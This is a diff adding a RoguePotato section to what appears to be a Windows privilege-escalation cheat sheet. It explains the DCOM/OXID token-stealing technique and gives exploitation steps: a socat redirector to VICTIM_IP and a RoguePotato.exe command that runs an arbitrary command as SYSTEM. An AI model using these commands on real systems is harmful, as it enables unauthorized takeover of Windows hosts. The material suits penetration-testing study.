@@ -53,6 +53,43 @@ NULL
 ```
 
 ### RoguePotato
+***user privilege that allows this exploit to work: SeImpersonatePrivilege,SeAssignPrimaryTokenPrivilege***
+
+![hot potato](https://jlajara.gitlab.io/assets/images/posts/20201122/Diagram_3.png)
+
+- **Rogue Potato** instruct the DCOM server to perform a **remote OXID query** by specifying a remote IP (Attacker IP)
+- On the remote IP, setup a “socat” listener for redirecting the OXID resolutions requests to a fake **OXID RPC Server**
+- The fake **OXID RPC server** implements the _ResolveOxid2_ server procedure, which will point to a controlled _Named Pipe_ [_ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]_].
+- The DCOM server will connect to the RPC server in order to perform the _IRemUnkown2_ interface call. By connecting to the _Named Pipe_, an “Autentication Callback” will be performed and we could impersonate the caller via RpcImpersonateClient() call.
+- Then, a **token stealer** will:
+    - Get the PID of the _rpcss_ service
+    - Open the process, list all handles and for each handle try to duplicate it and get the handle type
+    - If handle type is “Token” and token owner is SYSTEM, try to impersonate and launch a process with _CreatProcessAsUser()_ or _CreateProcessWithToken()_
+
+To dig deeper read the author’s blog post: [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
+
+#### What do you need to make it work?
+
+- You need to have a machine under your control where you can perform the redirect and this machine must be accessible on **port 135** by the victim
+- Upload both exe files from the [PoC](https://github.com/antonioCoco/RoguePotato). In fact it is also possible to launch the fake OXID Resolver in standalone mode on a Windows machine under our control when the victim’s firewall won’t accept incoming connections.
+
+More info: [https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html](https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html)
+
+***Exploitation***
+
+Download the binary from the repository: [Here](https://github.com/antonioCoco/RoguePotato)
+
+Run in your machine the _socat_ redirection (replace `VICTIM_IP`):
+
+```
+socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
+```
+
+Execute PoC (replace `YOUR_IP` and `command`):
+
+```
+.\RoguePotato.exe -r YOUR_IP -e "command" -l 9999
+```
 
 {% code overflow="wrap" %}
 ```bash
